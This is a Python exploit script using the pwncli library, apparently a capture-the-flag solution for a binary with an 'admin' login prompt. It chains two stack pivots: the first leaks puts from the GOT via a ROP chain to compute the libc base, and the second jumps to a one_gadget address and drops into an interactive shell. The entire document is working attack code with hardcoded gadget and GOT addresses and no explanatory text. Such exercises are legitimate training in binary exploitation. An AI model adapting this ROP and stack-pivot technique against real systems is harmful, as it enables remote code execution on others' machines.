from pwncli import *

cli_script()

p = gift['io']
libc = gift['libc']

gadget = 0x4527a

pop_rdi_ret = 0x401ab3
puts_got_addr = 0x602028
call_puts_addr = 0x4018b5
s1_addr = 0x602400

payload1 = flat({
    0:"admin\x00\x00\x00",
    8: [pop_rdi_ret, puts_got_addr, call_puts_addr]
})

payload2 = flat({
    0:"admin\x00\x00\x00",
    0x20:s1_addr
}, length=0x28, filler="\x00")

# stack pivot
p.sendafter(">", payload1)
p.recvuntil("u Pass\n")
p.sendafter(">", payload2)

msg = p.recvuntil("\x7f")
stop()
libc_base_addr = u64(msg[-6:].ljust(8, b"\x00")) - libc.sym['puts']
log_address("libc_base_addr", libc_base_addr)

one_gadget_addr = libc_base_addr + gadget

stop()

payload1 = flat({
    0:"admin\x00\x00\x00",
    8: [0, 0, one_gadget_addr]
})

payload2 = flat({
    0:"admin\x00\x00\x00",
    0x10:"admin\x00\x00\x00",
    0x20:s1_addr
}, length=0x28, filler="\x00")

# pivot again
p.sendafter(">", payload1)
p.recvuntil("u Pass\n")
p.sendafter(">", payload2)

p.interactive()